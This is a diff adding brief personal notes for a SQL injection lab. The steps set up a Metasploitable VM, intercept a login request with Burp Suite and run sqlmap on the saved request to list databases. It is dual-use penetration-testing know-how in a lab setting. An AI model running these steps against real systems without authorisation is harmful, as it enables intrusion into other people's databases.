@@ -1,0 +1,13 @@
+Terminal - ifconfig
+Metasploit- sudo ifconfig eth0 192.168.56.3 netmash 255.0.0.0
+Terminal- ping 192.168.56.3
+Browser- 192.168.56.3
+BurpSuite-Proxy-Option-intercept-on
+Browser- setting-ManualProxyConfiguration
+Browser- User-password to capture request
+username abc
+password abc
+
+SQLmap-terminal 
+SQLmap- sqlmap
+SQLman- sqlmap -r/root/Desktop/extract-data.txt -dbs
